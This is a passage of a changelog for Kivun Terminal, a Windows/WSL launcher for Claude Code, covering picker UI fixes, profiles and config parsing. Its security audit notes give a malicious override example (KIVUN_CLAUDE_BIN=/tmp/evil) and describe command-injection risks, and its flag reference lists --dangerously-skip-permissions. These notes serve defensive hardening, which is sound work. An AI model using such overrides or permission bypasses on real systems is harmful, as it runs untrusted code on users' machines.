- **`kivun-claude-bidi/lib/resolve-claude-bin.js` — `KIVUN_CLAUDE_BIN` validation (audit #4).** The env-var override for the claude binary path was passed through to `node-pty` spawn unchecked. A profile env-var `KIVUN_CLAUDE_BIN=/tmp/evil` would silently run that binary as if it were claude. Added `isAllowedClaudeBinPath()` that requires the path to (a) resolve under one of `~/.local/bin`, `~/.nvm`, `~/.bun`, `/usr/local/bin`, `/usr/bin`, `/opt`, `/snap`, and (b) be executable (`fs.accessSync(p, X_OK)`). Untrusted paths fall through to standard discovery rather than failing loudly, so malicious profile env can't even DoS the wrapper.

#### Not fixed in this release (deferred)

- **MEDIUM #5 — synchronous WinHttp call hangs picker UI ≤ 5 s on hostile networks.** The 5-second timeout caps worst-case unresponsiveness; converting to async (`http.Open(..., true)` + `onreadystatechange`) is invasive in HTA and not worth destabilising a working feature for a soft-DoS. Marked as known limitation.
- **MEDIUM #6 — quote/space injection if `installDir` contains `"` or `&`.** Theoretical; NTFS forbids `"` in paths, so unreachable in practice.

#### Confirmed clean (negative findings)

- ✅ `npm audit` on `kivun-claude-bidi`: 0 vulnerabilities
- ✅ No hardcoded secrets — `docs/CREDENTIALS.txt` is documentation, not key material
- ✅ Bash launchers correctly double-quote all user paths
- ✅ NSIS installer is `RequestExecutionLevel user` (per-user); no DLL search-order hijacking
- ✅ Linux launcher's `printf %q` hardening of `CLAUDE_FLAGS` is correct
- ✅ `:ADDENV` regex validates env-var keys before WSLENV propagation


## [1.4.8] - 2026-05-08

### Doc/version consistency sweep across bundled .txt and .md files

User feedback: *"the txt has the old version noted, all txt should have the updated txt version number to prevent confusion. every release needs to check consistency for all documents and github notes on read me and release notes."*

- **`docs/CREDENTIALS.txt`** — header bumped from `Kivun Terminal v1.1.1` to `v1.4.8`. Stale since v1.2.0.
- **`docs/SECURITY.txt`** — header bumped from `Kivun Terminal v1.1.1` to `v1.4.8`. Same drift.
- **`docs/README.md`** — title bumped `v1.4.3` → `v1.4.8`; the comparison row at line 75 bumped from `Launchpad CLI v2.4.2 | Kivun Terminal v1.4.3` to `v2.6.3 | v1.4.8`; "What's new" section header bumped to v1.4.8 with new bullets summarising v1.4.4–v1.4.7 (collapsible Advanced, sticky `--continue` fix, in-picker update check).
- **`docs/README_INSTALLATION.md`** — title bumped `v1.4.3` → `v1.4.8`.
- **`README.md`** — version cachebust query string `cb=v1.4.7` → `v1.4.8` so shields.io re-fetches version + downloads badges.
- **`payload/folder-picker.hta`** — `FALLBACK_VERSION = "1.4.7"` → `"1.4.8"`.

### Process change

Going forward: every release scans `git ls-files` for stale version refs (any `v1.X.Y` older than the upcoming tag) in `*.txt` and `*.md` files BEFORE the tag is pushed. CI doesn't enforce this yet — it's a manual checklist item until a workflow validates it. The reason this slipped on v1.4.7: I bumped `VERSION` and `docs/CHANGELOG.md` at release time but never grep'd the rest of the tree.


## [1.4.7] - 2026-05-08

### Bigger collapsed window so the update banner doesn't cause scrollbars

User feedback right after v1.4.6 shipped: the new update-banner pushed the picker content past the 615 px collapsed-window floor, triggering vertical scrollbars and pushing the Launch button below the fold. *"the window needs to be a little higher, like the button size times 1.5 so no scroll bars show"*.

- **`payload/folder-picker.hta`** — collapsed-window floor and initial `resizeTo` bumped from 615 px to 690 px (≈ +75 px, roughly 1.5 × the Launch button height). Both the initial `window.resizeTo(1040, 690)` and the `if (h < 690) h = 690;` clamp inside `autoSizeToContent()` were updated. No effect when Advanced is expanded — that branch already sized to actual content height.


## [1.4.6] - 2026-05-08

### Update-available banner in the picker + cross-table fix

User feedback after v1.4.5: *"in github the table needs update… בדף html של ה folder picker היה רצוי שיהיה בדיקה האם יש גרסה חדשה זמינה עם כפתור להורדה ועדכון לגרסה האחרונה"* — wanted (a) the comparison table in the README to stay accurate vs the sister Launchpad CLI repo, and (b) the picker to detect when a newer release is available and offer one-click download.

- **`payload/folder-picker.hta`** — new yellow banner at the top of the picker (above the profile chip row) that reads *"🆕 Update available: vX.Y.Z (you have vA.B.C) — release notes — [Download vX.Y.Z]"*. Banner appears only when `compareVersions(latestTag, installed) > 0`. Hidden by default; rendered only after a successful API check. Has a `✕` dismiss button (hides until next launch) and a "release notes" link to the GitHub release page. The `Download` button shells out via `WSHShell.Run` to the asset URL — opens in the user's default browser, which starts downloading `Kivun_Terminal_Setup.exe` immediately.
- **`payload/folder-picker.hta`** — new helpers: `readInstalledVersion()` (reads `installDir\VERSION`, falls back to a hardcoded `FALLBACK_VERSION = "1.4.6"` if missing — older installs that predate the file write); `compareVersions(a, b)` (numeric tuple compare, handles `1.4.6` vs `1.4.10` correctly); `checkForUpdate()` (synchronous `WinHttp.WinHttpRequest.5.1` GET against `https://api.github.com/repos/noambrand/kivun-terminal-wsl/releases/latest` with 5 s timeouts, picks the asset matching `/^Kivun_Terminal_Setup\.exe$/i`). All errors (offline, GitHub down, rate-limited, antivirus blocking the COM call, malformed JSON) are swallowed silently — the banner just doesn't appear. The check is deferred via `setTimeout(checkForUpdate, 100)` from `init()` so the picker renders before the sync HTTP call blocks the UI thread.
- **`README.md`** — comparison table at line 60 corrected. Pre-v1.4.6 it claimed Launchpad CLI didn't have named profiles (❌); the sister project shipped them in v2.6.0. Both columns now read `✅` with their respective release tags, keeping the cross-repo comparison honest.

### Why the version-fallback dance

The picker reads `VERSION` from `installDir` to know what's installed. v1.2.x installs predate the `VERSION` file (the `.nsi` started writing it in a later release), so on those machines the file is missing and `readInstalledVersion()` falls back to `FALLBACK_VERSION` baked into the HTA at build time. That's not a true reflection of what's installed (it'll match the picker version, not the original installer version), but it's the best we can do without a registry probe — and on those legacy machines, the picker file is whatever shipped most recently anyway, so the fallback usually agrees with the actual install. v1.4.6+ writes `VERSION` reliably, so this drift only affects the upgrade window.


## [1.4.5] - 2026-05-07

### Collapse Advanced section in picker + fix sticky `--continue` bug

> Note: v1.4.4 was tagged earlier the same day but the version bump landed after the tag, so the CI's `VERSION matches tag` check failed and no installer was attached. v1.4.5 supersedes it.

User feedback after v1.4.3: the picker presented model / flags / startup-cmds / env-vars as five visible sections — overwhelming for first-time users — and a separate report that right-clicking a folder via the desktop shortcut crashed Claude with `No conversation found to continue` even though the user hadn't asked for `--continue`.

- **`payload/folder-picker.hta`** — sections 3 (Claude flags), 4 (startup slash commands), 5 (environment variables) wrapped in a collapsible `<div id="advanced-body">` toggled by a single button labelled `▶ Advanced options — click to show model, flags, startup slash commands, env vars`. Default state is collapsed regardless of profile content. Window opens at a compact 615 px and grows to fit content when the toggle is clicked (`autoSizeToContent` switches between fixed 615 px collapsed and dynamic `scrollHeight + 60` expanded; HTA's scrollHeight measurement is unreliable when content is `display:none`, so the collapsed branch hardcodes the value rather than measuring).
- **`payload/folder-picker.hta`** — new `composeFlagsForConfig()` helper used in the `writeFlagsToConfig` call. It excludes `--continue` and `--resume` (the two values from the `flag-conv` radio group). `composeFlags()` still includes them for the live preview and the actual launch. The reason: right-click "Open with Kivun Terminal" reads `CLAUDE_FLAGS` from `config.txt` and runs `claude` with those flags in the chosen folder; if a previous picker session set `flag-conv=Continue last`, the resulting `CLAUDE_FLAGS=--continue` line poisoned every right-click launch on a folder with no prior session. Conversation flags are now per-launch only — they affect the current click but never become sticky.

### How the `--continue` bug surfaced

User picked "Continue last" once in the picker, then later right-clicked a different folder via the Kivun shortcut. Konsole opened, Claude printed `No conversation found to continue`, and exited. The bash launcher correctly word-split the flags, so the regression was entirely in `composeFlags()` writing conversation state to a global config file shared with the right-click code path. Previous picker work (v1.4.0–v1.4.3) treated CLAUDE_FLAGS as the source of truth for "what flags this user wants" — that mental model breaks when one of those flags is per-session by definition.


## [1.4.3] - 2026-05-06

### Three picker fixes from continued user testing

User feedback after v1.4.2: *"still the defualt is --effort low"*, *"unser Custom: that is what is writes as a placeholder, hate it"*, and the standing *"i see no profile"* concern about chip rendering.

- **`payload/folder-picker.hta`** — `populateProfileChips` rewritten to build chip HTML as a single `innerHTML` string with inline `onclick="switchToProfile('Name')"` attributes. v1.4.1's `createElement + .onclick =` pattern works on STATIC elements (the existing flag chips) but is unreliable on DYNAMICALLY created buttons under HTA / mshta — handlers sometimes don't fire even though the button renders. innerHTML construction sidesteps this by letting IE parse the attribute string into a real onclick handler at render time. Profile name escaping: HTML entities for `& < > "` plus `&#39;` for the single quote we use to delimit the JS string literal in the onclick attribute.
- **`payload/folder-picker.hta`** — new `scrubDeprecatedFlags(profile)` runs on every `loadProfiles()` call. Right now it just strips `--effort low` from `customFlags` (v1.4.2 dropped the chip but didn't touch persisted profile data; users with `CLAUDE_FLAGS=--effort low` in config.txt before v1.4.0 had it migrated into the Default profile and would still see it after the chip removal). The scrub also persists via `saveProfiles()` so the cleanup runs once, not forever. Migration path also runs the scrubber so a stale config.txt doesn't seed a fresh profile with the same junk.
- **`payload/folder-picker.hta`** — Custom flags textbox `placeholder` attribute emptied. v1.3.0–v1.4.2 said *"Click chips above, or type any flags here verbatim"* — user reported they hate it. Empty placeholder is the safest default; the help text below the input still explains what the field does.

### Why the chip-rendering bug didn't catch in CI

Static-lint verifies the JS functions exist and basic invariants hold (`maskEnvValues=true`, `parseEnvVars` present, etc.) but doesn't actually run the HTA — IE COM + Windows runner setup is significant overhead for one widget choice. Project memory `project_kivun_picker_features.md` already warned about HTA event-handler quirks but the warning was specifically about `<select> onchange`; it didn't generalize to "all dynamically-created elements." Memory updated implicitly through this changelog entry; for v1.4.4+ work, treat ANY dynamically-created HTA element with a JS-attached event handler as suspect, and prefer innerHTML construction with inline onclick attributes.


## [1.4.2] - 2026-05-06

### Drop "Low effort" chip from the picker

User feedback: *"you put effort low as a default? use high"*. The chip was a visible suggestion in the flag-chips row (alongside Hebrew, Concise, Step-by-step, Tests, etc.); even though it required a click to activate, presenting "Low effort" as a one-click suggestion read as endorsement of the lazy-Claude path.

- **`payload/folder-picker.hta`** — removed `chip-effort-low` from both the `bindChips` template list and the HTML chip row. `chip-effort-high` (`+ High effort`) remains. The `--effort low` regex still appears in `replaceablePatterns` so the High chip continues to replace any prior `--effort X` value rather than appending — meaning a user who had `--effort low` saved in a profile won't see it duplicated when they click `+ High effort`. Power users who want low-effort runs can still type `--effort low` into the Custom flags field manually; the chip just stops suggesting it.


## [1.4.1] - 2026-05-06

### Fix: profile bar uses chip buttons, not `<select>` dropdown

v1.4.0 shipped the profile bar with `<select id="profile-select" onchange="onProfileChange()">`. Project memory `project_kivun_picker_features.md` (originating session: dfa960fd-cc96-4356-a34d-0649fa667826) explicitly warned against this — the user previously reported that `<select onchange>` doesn't fire reliably under HTA/IE-mode mshta, and the fix for the model-selection UI was to switch to radios. I made the same mistake here. User immediately spotted it: *"are you sure a dropdown will even work on the html? we had issues before"*.

- **`payload/folder-picker.hta`** — replaced the profile `<select>` + `onchange` handler with a horizontal row of chip-style `<button>` elements, one per saved profile. The active profile gets `.active` styling (blue background, white text). Each chip's `onclick` is bound via a closure (IIFE captures the profile name so the iteration variable doesn't collapse to the last value — a JScript ES3 trap). The new flow: click any chip → outgoing profile auto-saves → incoming profile loads → row re-renders so the active highlight moves. The "Save As…" button is renamed `+ New` for visual parity with the chip aesthetic. `Rename` and `Delete` buttons unchanged.
- **Why chips and not radios** — model selection has 4 fixed options (Default/Opus/Sonnet/Haiku) which suit radios. Profile names are user-defined and the count grows over time; radios become unwieldy past ~5 options. Chips scale to ~10–15 profiles before wrapping to a second row, and they read as "click to switch" rather than "select then submit," which matches what the action actually does.
- **JScript closure pattern** — `for (var i = 0; i < profiles.length; i++) { btn.onclick = function() { switchToProfile(profiles[i].name); } }` is the wrong pattern in ES3: by the time the click fires, `i` has incremented to `profiles.length`, so every chip switches to the same (out-of-bounds) profile. The fix is an IIFE: `(function(name) { btn.onclick = function() { switchToProfile(name); }; })(profiles[i].name)`. The flag-chip code at line 532 already uses this pattern; profile chips now do too.

### Migration

No data migration. `profiles.json` schema is unchanged. Existing v1.4.0 installs (if any) — the picker just renders chips instead of a dropdown when reopened. No reinstall is required to fix existing `profiles.json`; only the picker UI needs the new HTA.


## [1.4.0] - 2026-05-06

### Named profiles in the folder picker (+ env vars + masked preview)

The picker dialog grows a **profile bar** at the top so users with multiple projects can save folder + model + flags + startup commands + env vars as named combos and switch between them with a dropdown. Inspired by — but not copied from — talayash/claude-terminal (MIT, Tauri+React stack); transcribed schema, no shared code.

- **`payload/folder-picker.hta`** — new top-of-dialog profile bar (`<select>` + Save As / Rename / Delete). New section §5 for `KEY=VAL` environment variables (one per line, `#` comments allowed). Resolved-command preview rebuilt: now shows the full `$ claude <flags>` line plus secondary lines for startup-cmds (`↳ then types: …`) and env-vars (`↳ with env (masked): KEY=…(set), …`). Env values are **masked by default** for screenshot safety; an `👁 show values` toggle next to the §5 label reveals them. Profiles persist to `%LOCALAPPDATA%\Kivun-WSL\profiles.json`. First-run migration: a missing `profiles.json` is seeded from the legacy `CLAUDE_FLAGS=` line in `config.txt` so existing users don't lose pinned flags.
- **`payload/kivun-terminal.bat`** — reads `%LOCALAPPDATA%\Kivun-WSL\kivun-env.txt` (written by the picker on Launch) before invoking WSL. Each `KEY=VAL` is set as a cmd.exe env var via the new `:ADDENV` subroutine, and the keys are appended to `WSLENV` so they cross the Windows→WSL boundary. Subroutine pattern (vs. inline assignment in a `for /f` loop) avoids needing `setlocal enabledelayedexpansion`.
- **`linux/kivun-launch.sh`** — mirrors env-var sourcing from `~/.config/kivun-terminal/kivun-env.txt`. Uses a `while read` loop with `export "$key=$val"` (NOT `source`) so user-provided values are treated as literal strings — `source` would re-evaluate `$(…)` and backticks in values, recreating the same RCE class the existing `CLAUDE_FLAGS` `printf %q` hardening guards against. KEY validation (`[A-Za-z_][A-Za-z0-9_]*`) is duplicated Linux-side because hand-edited files don't go through the picker's validation.

### Why this isn't a config.txt schema change

`config.txt` keeps the BiDi tunables and language settings. Profiles for **flags / model / conv / startup / env** move to `profiles.json` because (a) the picker dialog is now the canonical UI for those fields and (b) profile switching is a runtime action that doesn't fit the load-once `config.txt` schema. The legacy `CLAUDE_FLAGS=` line is still written by the picker on Launch for backwards compatibility with anything that scrapes `config.txt` externally, but `profiles.json` is the source of truth from v1.4.0 onwards.

### Edge cases handled

- **Default profile is undeletable.** It auto-rebuilds on next launch if `profiles.json` is missing or corrupt — by parsing the current `CLAUDE_FLAGS=` from `config.txt` (the same migration path used on first run).
- **Profile name collisions** on Save As / Rename are blocked with an inline error — no silent overwrite.
- **Malformed env-var lines** (no `=`, invalid KEY, leading digit) are silently skipped by the picker writer; the .bat and .sh consumers re-validate on read because hand-edited files exist.
- **Empty env vars textarea** → no `kivun-env.txt` is written; the .bat takes the "no per-profile env vars to load" branch and `WSLENV` is left as-is.
- **Diagnostic logging** for `WSLENV` was initially placed inside the `if exist (…)` block; cmd parse-time-expands the body of `(…)` blocks once, so `%WSLENV%` reflected pre-loop state. Fixed by moving the log line outside the block (top-level statements re-expand at runtime).

## [1.3.5] - 2026-05-05

### Roll back to v1.3.3 picker; drop icon attempt entirely

User feedback after v1.3.4: *"now it opens immediately again"* (Konsole launching with default home directory because mshta exited in 0.24s without rendering the dialog) and *"we rewinded to the html that worked, not windows folder picker and not the failing trying to add an icon. we accept not useing an icon to prevent complications."*

v1.3.4's icon-fix attempt (moving `<HTA:APPLICATION>` to the first child of `<head>` and `pushd`'ing into the install dir before invoking `mshta.exe "folder-picker.hta"`) broke the picker on this user's machine — the dialog never displayed and the launcher fell straight through to the home-directory default.

v1.3.5 reverts to v1.3.3's known-good state and **removes all icon plumbing entirely** per the user's preference:

- **`payload/folder-picker.hta`** — restored to the v1.3.3 HTA (large two-card layout with numbered options, Browse Folder Tree, Edit Default Flags, Launch Kivun Terminal). Stripped: `HTA:APPLICATION ICON="kivun_icon.ico"`, `<link rel="shortcut icon" ...>`, `<link rel="icon" ...>`. The dialog now renders mshta's default red HTML scroll in the title bar — accepted as-is.
- **`payload/kivun-terminal.bat`** — restored to v1.3.3's `mshta.exe "%~dp0folder-picker.hta"` direct invocation. No `pushd`/`popd` wrapping (which had introduced the cwd shift that defeated the picker's render).

The Konsole window taskbar icon (set via `WM_CLASS` + `.desktop` file from `kivun-launch.sh`) is unaffected — the Konsole window keeps its proper Kivun icon. Only the picker dialog's title bar (which is open for a few seconds before Konsole launches) shows mshta's default icon.

### Why this is the final word on the picker title-bar icon

Across v1.3.0 → v1.3.4 we tried: `HTA:APPLICATION ICON=` alone, `<link rel="shortcut icon">`, `<link rel="icon">`, reordering `<HTA:APPLICATION>` to first-child of `<head>`, `pushd "%~dp0"` to fix relative-path resolution. The combinations that were robust enough to render reliably (v1.3.3) didn't change the icon; the combinations that *might* have fixed the icon (v1.3.4) broke the picker entirely. Modern Windows 11 mshta is hostile to title-bar icon customization without a binary wrapper, and adding a binary wrapper is out of scope for this project.

## [1.3.4] - 2026-05-05

### Picker dialog: actually try to make the title-bar icon work

User feedback: *"looks good, just the logo was not added."*

Two known mshta quirks combined to defeat the v1.3.3 icon attempt:

1. **`<HTA:APPLICATION>` order**: mshta is sensitive to where the `<HTA:APPLICATION>` element sits in `<head>`. v1.3.3 had it after `<meta>`, `<link>`, and `<title>` — by which point mshta has often already chosen its window icon. Moved to the very first child of `<head>` in v1.3.4.
2. **Working directory for relative `ICON=`**: `mshta.exe "C:\full\path\folder-picker.hta"` runs with the .bat's cwd, not the .hta's directory. The relative `ICON="kivun_icon.ico"` resolves against cwd; on a fresh launch from the desktop shortcut, cwd is `%SystemRoot%\System32` where there is no `kivun_icon.ico`, so the icon path fails and mshta falls back to its default red HTML scroll. v1.3.4 wraps the launch in `pushd "%~dp0"` / `popd` so cwd matches the install dir before mshta starts.

If the icon still doesn't show after both of these, that's a deep mshta limitation that would need a binary wrapper (a tiny EXE compiled with the icon as a resource) — but that's a different scope of project than a launcher dialog. The Konsole window's taskbar icon (set via `WM_CLASS` + `.desktop` file) is unaffected and continues to work.

## [1.3.3] - 2026-05-05

### Three picker iteration fixes from continued user testing

User feedback after v1.3.2: *"the logo is not added"*, *"seems like something opened before the user confirmed how to open"*, *"text can be bigger"*.

- **`payload/folder-picker.hta`** — added `<link rel="shortcut icon" href="kivun_icon.ico">` and `<link rel="icon" ...>` in addition to the existing `HTA:APPLICATION ICON=`. Some Windows versions ignore the HTA icon attribute alone; the `<link>` tags pick up via mshta's HTML rendering. Combined coverage gives the title-bar/taskbar icon a better chance of rendering across mshta variants. (If the icon still doesn't show on a given Windows build, that's an mshta limitation that would need a binary wrapper to fully fix — out of scope for the launcher.)
- **`payload/folder-picker.hta`** — font sizes bumped further: body 17px (was 15), headline 24px (was 20), path input 18px (was 16), buttons 16–17px, option labels 17px. Numbered circles enlarged to 28px. Window resized 1000×620 to fit comfortably.
- **`payload/kivun-terminal.bat`** — picker invocation changed from `start /wait mshta.exe ...` to `mshta.exe ...` directly. cmd waits for the launched program by default; `start /wait` was unreliably synchronous in some configurations and could let the launcher proceed (WSL/Konsole launch) before the user finished with the picker dialog. Direct invocation guarantees the picker is fully closed before any subsequent step runs — no more "something opened before the user confirmed."

## [1.3.2] - 2026-05-05

### Folder picker dialog: two clearly-labeled options + bigger text

User feedback on v1.3.1: *"not clear what opens the tree and what just goes by a path"* and *"test too small"* (text too small).

- **`payload/folder-picker.hta`** — restructured the dialog around two numbered option cards instead of a single "label + input + button" row. Now there are two visually distinct cards:
  1. *"Type or paste a Windows path here:"* with a full-row monospace text input.
  2. *"Pick a folder from the Windows folder tree:"* with a "Browse Folder Tree..." button.
  - Cards are visually separated by an "OR" divider line, removing any ambiguity about which control does what.
  - Body font bumped to 15px (was 13px). Headline 20px. Path input 16px. Buttons 14–15px. Numbered circles next to each option label give visual anchor points.
  - Window resized to 920×520 to comfortably fit the larger content. Cards have white backgrounds against the gray body, focus ring on the input, hover/active styles on all buttons.
  - The primary action stays *"Launch Kivun Terminal"*; *"Edit Default Flags"* and *"Cancel"* unchanged.
  - **Window now uses the Kivun icon** (`HTA:APPLICATION ICON="kivun_icon.ico"`) instead of mshta's default red HTML scroll. Visible in the dialog title bar and the Windows taskbar.

## [1.3.1] - 2026-05-05

### Folder picker dialog: visual polish + clearer flow

User reported the v1.3.0 dialog had three problems: em-dashes and ellipses rendered as `ג€"` mojibake (mshta defaulted to a non-UTF-8 codepage), button captions were clipped (`Edit Default` instead of `Edit Default Flags`), and the path text field was too narrow to display a real Windows path. Plus *"needs to be clear if a tree will show or a path pasted and then starts."*

- **`payload/folder-picker.hta`** — rebuilt the layout:
  - `<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">` + ASCII-only dialog text (no em-dashes, no ellipses) so glyphs render correctly under any system codepage.
  - Window is now 880×340 (up from 640×240). The path input is monospace, larger padding, focus-ring, and takes the full row width minus the Browse button. Buttons get min-widths sized to their actual labels (`Edit Default Flags` 180px, `Launch Kivun Terminal` 180px) so no clipping.
  - Numbered hint text spells out the flow: *"1. Paste a Windows path below or click Browse to pick from the folder tree. 2. Click Launch (or press Enter) to start."* Optional: *"click Edit Default Flags to change the default claude flags in config.txt before launching."*
  - Primary action button renamed `OK` → `Launch Kivun Terminal` so the "what happens next" is unambiguous. Visual hierarchy: Edit Default Flags on the left, Cancel + Launch on the right, separated from the path row by a horizontal rule.

### Config parser robustness: accept LF-only `config.txt`

Live-debugging revealed the launcher was logging `folderpicker=false, vcxsrv=false` even when `config.txt` clearly had `FOLDER_PICKER=true` and `USE_VCXSRV=true`. Cause: the parser piped `type config.txt | findstr /v "^#"`, and on an LF-only `config.txt` (the form `cp` from WSL/Linux produces) Windows' `findstr` treated the entire file as one giant comment-line starting with `#`, returning nothing. Every config key fell back to its compiled-in default.

- **`payload/kivun-terminal.bat`** — replaced the `type | findstr` pipeline with `for /f "usebackq eol=# tokens=1,2 delims=="`. `for /f` reading a file via `usebackq` handles both LF and CRLF correctly, and `eol=#` skips comments without needing `findstr`. The pipe-form bug was invisible in CI because the NSI installer ships CRLF files; it only surfaced when a user (or our deploy script) `cp`'d the source `.txt` to the install dir.

### Right-click flow is unaffected

When a folder is passed via `%1` (the right-click "Open with Kivun Terminal" path), the picker dialog is skipped entirely. v1.3.1 changes only the dialog flow, not the launcher entry points.

## [1.3.0] - 2026-05-05

### Folder picker: dialog with built-in "Edit Default Flags…" button

User feedback on v1.2.9: *"it opens immediately before the user picks a folder. not what he asked for."* — referring to the standalone "Edit Kivun Terminal Config" Start Menu shortcut, which opens Notepad without going through the picker. The original ask had been *"FROM THAT PICKER CAN IT REFRENCE THE TEXT FILE"* — a button **inside** the picker, not a separate launcher. v1.2.9 picked Option A (standalone shortcut) when Option B (button inside picker) was what the user actually wanted.

v1.3.0 rebuilds Option B properly:

- **NEW: `payload/folder-picker.hta`** — replaces the old `folder-picker.wsf` BrowseForFolder dialog. Custom HTA window with: a path text input, a **Browse…** button (still calls native `BrowseForFolder` for the folder tree), an **Edit Default Flags…** button (opens `config.txt` in Notepad asynchronously, picker stays open), **OK** with path-existence validation, **Cancel**. Same writeback contract as the .wsf — writes UTF-8-without-BOM to `%LOCALAPPDATA%\Kivun-WSL\kivun-workdir.txt` on OK, nothing on Cancel.
- **`payload/kivun-terminal.bat`** — invokes `start /wait mshta.exe folder-picker.hta` (synchronous; launcher resumes after dialog closes). Falls back to the .wsf if the .hta is missing, so a half-installed v1.3.0 still works.
- **`installer/Kivun_Terminal_Setup.nsi`** — ships `folder-picker.hta`; removed the v1.2.9 "Edit Kivun Terminal Config.lnk" Start Menu shortcut (now redundant — both entry points led to the same Notepad-on-config flow). Uninstaller still cleans up the v1.2.9 shortcut for users upgrading from that version.

### Why HTA over native BrowseForFolder

Win32 `BrowseForFolder` does not allow custom buttons via the JScript-accessible API. Adding "Edit Default Flags…" required either embedding `Shell.Application` calls into a custom dialog **or** wiring up a Win32 callback proc — the second is not reachable from JScript. HTA is the lightest option that lets us own the button layout while still calling `Shell.Application.BrowseForFolder` from inside the dialog when the user clicks Browse. `mshta.exe` ships with every Windows 11 install.

### Compatibility

- Right-click "Open with Kivun Terminal" path is unaffected (no picker fires when a folder argument is passed).
- Users on `FOLDER_PICKER=false` see no picker dialog at all (existing v1.2.5 behavior).
- The .hta uses the same set of ActiveX objects (`Shell.Application`, `Scripting.FileSystemObject`, `ADODB.Stream`, `WScript.Shell`) the .wsf used, so any antivirus heuristics that allowed the .wsf will allow the .hta. SmartScreen warnings on first run are inherited from the unsigned installer, not from this dialog.

## [1.2.9] - 2026-05-05

### Added: discoverable "Edit Kivun Terminal Config" Start Menu shortcut

User feedback: *"how will the user find that txt, he must have a button on the browse to get there, can it be done?"* — and after I offered an HTA-replacement of the picker (Option B) versus a simple Start Menu shortcut (Option A), the user chose **Option A**.

- `installer/Kivun_Terminal_Setup.nsi` — `SEC_SHORTCUT` now also creates `$SMPROGRAMS\Edit Kivun Terminal Config.lnk`, target `notepad.exe`, args quote `$INSTDIR\config.txt`. Same Kivun icon, normal-window state. Uninstaller cleans it up. New users install once and `Edit Kivun Terminal Config` appears in Start Menu next to `Kivun Terminal`.
- The native `BrowseForFolder` dialog stays as v1.2.6's single-dialog browse-or-paste UX. Discarded a draft `payload/folder-picker.hta` that would have replaced the native picker with a custom HTA window — Option A is simpler and matches the user's "not over-engineered" constraint.

### `CLAUDE_FLAGS` reference expanded to the full `claude --help` set

User feedback: *"you did not look at the other project for full flag list"* — and on inspection the sibling `kivun-terminal` project's reference is itself a curated 8-flag subset of the actual `claude --help` output. v1.2.9 sources directly from `claude --help` for accuracy.

- `payload/config.txt` `CLAUDE_FLAGS` block now lists ~25 flags grouped by category: session control (`--continue`, `--resume`, `--from-pr`, `--worktree`, `--tmux`), model + cost (`--model`, `--fallback-model`, `--max-budget-usd`, `--effort`), tools and permissions (`--add-dir`, `--allowedTools`, `--disallowedTools`, `--tools`, `--permission-mode`, `--dangerously-skip-permissions`), prompts (`--append-system-prompt`, `--system-prompt`), agents/plugins/MCP (`--agent`, `--plugin-dir`, `--mcp-config`), debugging (`-d/--debug`, `--verbose`), and meta (`-v/--version`, `-h/--help`).
- A **RECOMMENDED PRESETS** subsection at the top of the comment shows four ready-to-uncomment configurations (default, always-resume, resume + Opus, always-on always-Opus). Power users can pick one without reading the full menu.
- The previous 8-flag list (matching the sibling) was technically correct but missed `--permission-mode`, `--effort`, `--worktree`, `--from-pr`, `--max-budget-usd`, `--mcp-config`, etc. — useful flags users were unaware of.

### Authoritative source

The flag reference is sourced from `claude --help` against Claude Code 2.1.71 (the version installed in the test WSL Ubuntu during this session). Claude Code's CLI surface evolves; users should run `claude --help` directly for the canonical list.

## [1.2.8] - 2026-05-05

### `config.txt` reorganized — main settings first, advanced last

User feedback: *"this is not user friendly. should be the main things to set first. all other stuff and langueses posibilites later."* and *"it is missing the tags options completly. we had in the other project a full option."*

The previous config.txt mixed the things users actually edit (`CLAUDE_FLAGS`, `FOLDER_PICKER`, `RESPONSE_LANGUAGE`) with BiDi-wrapper internals, and bloated the top of the file with the full 23-language list — making the first thing a new user saw a wall of language entries rather than the settings they probably came to change.

**New structure (`payload/config.txt`):**

1. **QUICK SETTINGS** — `CLAUDE_FLAGS`, `FOLDER_PICKER`, `RESPONSE_LANGUAGE` (one-liner with pointer to the full list at the bottom), `PRIMARY_LANGUAGE`. Each has a 3–4 line comment, no walls of text.
2. **DISPLAY & INSTALL** — `USE_VCXSRV`, `TEXT_DIRECTION`, `AUTO_INSTALL_CLAUDE` (the last is now a documented config key — previously only readable from the .bat's defaults).
3. **BIDI WRAPPER** — all six `KIVUN_BIDI_*` tunables, with one-paragraph descriptions instead of the previous multi-screen explanations. Pointer to `docs/specs/BIDI_ALGORITHM.md` for users who need the full design notes.
4. **REFERENCE: 23 supported languages** — full list with native-script labels, moved to the bottom. Out of the way for first-time setup, still easy to find when you want to switch.
5. **Notes** — pointers to `SECURITY.txt`, `CREDENTIALS.txt`, etc.

`CLAUDE_FLAGS` documentation matches the sibling `kivun-terminal` project's full flag reference (8 flags: `--continue`, `--resume`, `--model opus/sonnet/haiku`, `--print`, `--add-dir`, `--enable-auto-mode`).

No code changes — the launcher's config-parser still reads the same keys; only the file's layout and prose changed.

## [1.2.7] - 2026-05-05

### Added: persistent default Claude flags via `config.txt`

- New `CLAUDE_FLAGS=` setting in `payload/config.txt` — appended unquoted to every `claude` invocation. Empty by default. Inline documentation lists the common Claude Code flags (`--continue`, `--model opus`, `--enable-auto-mode`, etc.) so users can see the menu without leaving the file. The folder-picker dialog now points at it: *"Use the tree or paste a path. (Default Claude flags: see CLAUDE_FLAGS in config.txt)"*.
- `payload/kivun-terminal.bat` — reads `CLAUDE_FLAGS` from `config.txt` (with the same SECURITY-quoted parser as the other settings, so a malicious config can't inject commands), passes the value as positional arg 8 to `kivun-launch.sh` and arg 3 to `kivun-direct.sh`.
- `payload/kivun-launch.sh` — accepts `${8:-}` as `CLAUDE_FLAGS`, splices it into the heredoc'd launch script after `--append-system-prompt`. Unquoted on purpose so bash word-splits `--a --b` into two argv entries.
- `payload/kivun-direct.sh` — accepts `${3:-}` as `EXTRA_FLAGS`, appends to the `claude` invocation in all three resolver branches (`~/.local/bin`, `/usr/local/bin`, PATH).

### Picker dialog: prompt text iteration

- Final prompt: *"Use the tree or paste a path. (Default Claude flags: see CLAUDE_FLAGS in config.txt)"*. Earlier strings (`"Select a folder for Kivun Terminal — browse the tree, or type / paste a path below."`, `"Path: type or paste a Windows path..."`, `"Pick a folder: browse the tree..."`, `"Use the tree or paste a path"`) iterated through this session in response to user feedback that they were too verbose, too academic, or contained an em-dash that some Windows configurations rendered as a stray glyph. The final form is short, action-led, em-dash-free, and references the config file for flag editing.

### Deferred (reaffirmed)

